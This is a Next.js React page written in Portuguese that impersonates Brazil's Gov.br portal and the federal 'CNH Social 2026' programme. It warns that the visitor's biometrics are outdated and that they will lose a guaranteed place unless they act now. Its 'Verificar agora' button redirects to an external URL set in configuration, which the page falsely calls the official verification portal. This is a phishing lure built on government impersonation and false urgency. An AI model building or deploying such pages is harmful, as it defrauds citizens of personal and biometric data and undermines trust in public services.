'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { AlertTriangle } from 'lucide-react';

export default function BiometriaPage() {
  const router = useRouter();
  const [urlRedirect, setUrlRedirect] = useState('');

  useEffect(() => {
    // URL de redirecionamento (pode ser configurada via env ou deixar vazia por enquanto)
    const redirectUrl = process.env.NEXT_PUBLIC_BIOMETRIA_REDIRECT_URL || '';
    setUrlRedirect(redirectUrl);
  }, []);

  const handleVerificarBiometria = () => {
    if (urlRedirect) {
      // Redirecionar para site externo
      window.location.href = urlRedirect;
    } else {
      // Por enquanto, apenas um alerta (será substituído pela URL real)
      alert('Redirecionamento configurado! Por enquanto sem URL definida.');
      // Opcional: voltar para home
      // router.push('/');
    }
  };

  return (
    <div className="flex min-h-screen items-center justify-center bg-gray-50 px-4 py-8">
      <div className="w-full max-w-md">
        {/* Logo Gov.br */}
        <div className="mb-8 text-center">
          <div className="mx-auto mb-4 flex h-20 w-32 items-center justify-center">
            <Image
              src="/govbr.svg"
              alt="Logo Gov.br"
              width={140}
              height={60}
              className="h-auto w-full"
            />
          </div>
        </div>

        {/* Card de Alerta */}
        <div className="rounded-lg border-l-4 border-red-500 bg-red-50 p-6 shadow-lg">
          <div className="mb-4 flex items-center gap-3">
            <AlertTriangle className="h-8 w-8 flex-shrink-0 text-red-600" />
            <h1 className="text-2xl font-bold text-red-900">
              ⚠️ URGENTE: Biometria Desatualizada
            </h1>
          </div>

          <div className="space-y-4 text-gray-700">
            <p className="text-base">
              Identificamos que sua <strong className="text-red-700">biometria está desatualizada</strong> em nosso sistema.
            </p>
            <p className="text-base">
              Se você <u>não atualizar agora</u>, poderá <strong className="text-red-700">perder a vaga garantida</strong> da CNH Social 2026.
            </p>
          </div>

          <button
            onClick={handleVerificarBiometria}
            className="mt-6 flex w-full items-center justify-center gap-2 rounded-lg bg-blue-600 px-6 py-4 text-lg font-bold text-white shadow-md transition-colors hover:bg-blue-700"
          >
            <svg className="h-5 w-5" fill="currentColor" viewBox="0 0 20 20">
              <path d="M10 12a2 2 0 100-4 2 2 0 000 4z" />
              <path fillRule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clipRule="evenodd" />
            </svg>
            Verificar agora
          </button>

          <div className="mt-6 rounded-md bg-yellow-100 p-4">
            <p className="text-sm text-yellow-800">
              <strong>Importante:</strong> Este procedimento é obrigatório e leva apenas alguns minutos. 
              Você será redirecionado para o portal oficial de verificação biométrica.
            </p>
          </div>
        </div>

        {/* Rodapé */}
        <div className="mt-8 text-center">
          <p className="text-sm text-gray-600">
            © {new Date().getFullYear()} Governo Federal - CNH Social
          </p>
          <button
            onClick={() => router.push('/')}
            className="mt-2 text-sm text-blue-600 hover:underline"
          >
            Voltar para o início
          </button>
        </div>
      </div>
    </div>
  );
}
